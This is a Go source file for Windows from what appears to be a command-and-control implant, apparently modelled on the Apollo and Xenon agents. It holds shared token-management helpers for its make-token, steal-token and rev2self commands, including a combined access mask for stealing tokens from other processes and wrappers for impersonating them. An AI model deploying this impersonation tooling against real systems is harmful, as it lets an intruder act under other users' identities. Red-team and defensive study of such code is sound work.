//go:build windows
// +build windows

package commands

import (
	"fmt"
	"sync"

	"golang.org/x/sys/windows"
)

// Token state management - centralized like Apollo's IdentityManager
// and Xenon's gIdentityToken in Identity.c
var (
	// gIdentityToken holds the current impersonation token
	// This is set by make-token and steal-token, cleared by rev2self
	gIdentityToken windows.Token

	// tokenMutex protects token operations from race conditions
	tokenMutex sync.Mutex
)

// Windows API constants for token manipulation
const (
	LOGON32_LOGON_INTERACTIVE       = 2
	LOGON32_LOGON_NETWORK           = 3
	LOGON32_LOGON_BATCH             = 4
	LOGON32_LOGON_SERVICE           = 5
	LOGON32_LOGON_UNLOCK            = 7
	LOGON32_LOGON_NETWORK_CLEARTEXT = 8
	LOGON32_LOGON_NEW_CREDENTIALS   = 9

	LOGON32_PROVIDER_DEFAULT  = 0
	LOGON32_PROVIDER_WINNT50  = 3
	LOGON32_PROVIDER_VIRTUAL  = 4

	// Token access rights - use specific rights instead of TOKEN_ALL_ACCESS
	// TOKEN_ALL_ACCESS often fails on protected processes
	TOKEN_ASSIGN_PRIMARY    = 0x0001
	TOKEN_DUPLICATE         = 0x0002
	TOKEN_IMPERSONATE       = 0x0004
	TOKEN_QUERY             = 0x0008
	TOKEN_QUERY_SOURCE      = 0x0010
	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_ADJUST_GROUPS     = 0x0040
	TOKEN_ADJUST_DEFAULT    = 0x0080
	TOKEN_ADJUST_SESSIONID  = 0x0100

	// Combined access for steal-token: query + duplicate + impersonate
	STEAL_TOKEN_ACCESS = TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE

	// Process access rights (PROCESS_QUERY_INFORMATION is in vanillainjection.go)
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
)

// Windows API procedures - shared across all token commands
// Note: kernel32 is declared in vanillainjection.go
var (
	advapi32                    = windows.NewLazySystemDLL("advapi32.dll")
	procLogonUserW              = advapi32.NewProc("LogonUserW")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf            = advapi32.NewProc("RevertToSelf")
	procDuplicateTokenEx        = advapi32.NewProc("DuplicateTokenEx")
	procSetThreadToken          = advapi32.NewProc("SetThreadToken")
	procOpenProcessToken        = advapi32.NewProc("OpenProcessToken")
)

// RevertCurrentToken implements Xenon's IdentityAgentRevertToken (Identity.c lines 35-52)
// Closes any existing impersonation token and reverts to original context
func RevertCurrentToken() error {
	tokenMutex.Lock()
	defer tokenMutex.Unlock()

	// Close existing token if present
	if gIdentityToken != 0 {
		windows.CloseHandle(windows.Handle(gIdentityToken))
		gIdentityToken = 0
	}

	// Call RevertToSelf to drop any thread impersonation
	ret, _, err := procRevertToSelf.Call()
	if ret == 0 {
		return fmt.Errorf("RevertToSelf failed: %v", err)
	}

	return nil
}

// SetIdentityToken stores the token and impersonates it
func SetIdentityToken(token windows.Token) error {
	tokenMutex.Lock()
	defer tokenMutex.Unlock()

	// Clear any existing token first
	if gIdentityToken != 0 {
		windows.CloseHandle(windows.Handle(gIdentityToken))
		gIdentityToken = 0
		procRevertToSelf.Call()
	}

	// Impersonate the new token
	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(token))
	if ret == 0 {
		return fmt.Errorf("ImpersonateLoggedOnUser failed: %v", err)
	}

	// Store the token for later use
	gIdentityToken = token
	return nil
}

// GetTokenUserInfo implements Xenon's IdentityGetUserInfo (Identity.c lines 88-114)
// Returns "DOMAIN\username" for the given token
func GetTokenUserInfo(token windows.Token) (string, error) {
	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return "", fmt.Errorf("GetTokenUser failed: %v", err)
	}

	account, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		return "", fmt.Errorf("LookupAccount failed: %v", err)
	}

	return fmt.Sprintf("%s\\%s", domain, account), nil
}

// GetCurrentIdentity returns the current thread or process identity
func GetCurrentIdentity() (string, error) {
	// Try thread token first (if impersonating)
	var threadToken windows.Token
	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, true, &threadToken)
	if err == nil {
		defer threadToken.Close()
		return GetTokenUserInfo(threadToken)
	}

	// Fall back to process token
	processHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return "", fmt.Errorf("GetCurrentProcess failed: %v", err)
	}

	var processToken windows.Token
	err = windows.OpenProcessToken(processHandle, windows.TOKEN_QUERY, &processToken)
	if err != nil {
		return "", fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer processToken.Close()

	return GetTokenUserInfo(processToken)
}

// HasActiveImpersonation checks if we're currently impersonating
func HasActiveImpersonation() bool {
	var threadToken windows.Token
	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, true, &threadToken)
	if err != nil {
		return false
	}
	threadToken.Close()
	return true
}
